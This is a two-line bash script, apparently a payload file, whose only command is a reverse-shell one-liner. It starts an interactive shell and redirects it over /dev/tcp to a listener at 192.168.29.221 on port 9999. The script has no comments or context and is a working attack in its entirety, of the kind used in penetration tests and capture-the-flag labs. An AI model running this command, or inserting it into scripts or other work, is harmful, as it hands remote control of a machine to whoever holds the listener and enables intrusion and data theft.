#!/bin/bash

sh -i >& /dev/tcp/192.168.29.221/9999 0>&1
